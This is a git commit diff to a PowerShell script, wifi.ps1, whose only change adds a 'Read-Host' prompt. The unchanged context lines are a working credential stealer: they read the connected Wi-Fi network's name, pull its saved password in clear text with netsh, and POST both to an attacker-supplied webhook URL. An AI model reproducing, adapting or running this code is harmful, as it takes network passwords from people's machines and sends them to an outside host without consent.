bd87aeea2a55f1293733a32160bcf3a0c797d9f4
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-01-30 17:55:54 +0000

    Update wifi.ps1

--- assets/wifi.ps1
+++ assets/wifi.ps1
@@ -6,3 +6,4 @@ $pos = $ssid.IndexOf(':')
 $ssid = $ssid.Substring($pos+2).Trim()
 $pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
 Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid : $pass"
+Read-Host -Prompt hi
